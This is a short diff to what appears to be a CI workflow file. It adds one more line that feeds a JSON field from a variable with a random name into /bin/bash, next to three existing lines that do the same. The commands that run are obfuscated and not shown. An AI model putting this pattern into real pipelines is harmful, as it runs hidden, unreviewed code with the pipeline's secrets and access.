@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$lauwm5" | jq -r .shb6 | /bin/bash
           echo $xv643 | jq -r .om287 | /bin/bash
           printf '%s' "$ixc4112" | jq -r .e66 | /bin/bash
+          echo $gdmq5 | jq -r .lc44 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
